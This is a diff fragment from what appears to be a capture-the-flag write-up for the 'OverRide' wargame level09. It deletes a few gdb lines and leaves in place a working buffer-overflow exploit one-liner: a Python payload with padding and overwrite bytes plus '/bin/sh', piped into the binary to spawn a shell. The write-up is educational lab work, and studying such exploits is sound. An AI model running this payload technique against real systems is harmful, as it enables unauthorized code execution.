@@ -106,9 +106,6 @@ So we build our exploit:
 
 Let's pipe that into the binary stdin.
 ```
-level09@OverRide:~$ gdb -q level09
-Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
-(gdb) quit
 level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"'; cat) | ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
